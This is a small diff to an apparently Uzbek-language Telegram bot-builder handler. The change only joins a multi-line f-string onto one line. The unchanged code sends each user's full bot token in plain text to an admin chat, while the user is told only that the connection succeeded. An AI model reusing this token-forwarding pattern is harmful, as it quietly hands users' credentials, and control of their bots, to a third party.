@@ -10,7 +10,5 @@ def handle_token_input(bot, message, ADMIN_ID):
     db["tokens"][token] = {"owner": user_id}
     db["limits"][user_id] = db["limits"].get(user_id, 0) + 1
     save_db(db)
-    bot.send_message(ADMIN_ID, f"✅ Yangi bot token qabul qilindi:
-👤 {message.from_user.first_name} ({user_id})
-🔐 Token: {token}")
+    bot.send_message(ADMIN_ID, f"✅ Yangi bot token qabul qilindi:👤 {message.from_user.first_name} ({user_id})🔐 Token: {token}")
     bot.send_message(message.chat.id, "✅ Bot muvaffaqiyatli ulandi. Endi unga tugmalar qo‘shishingiz mumkin.")
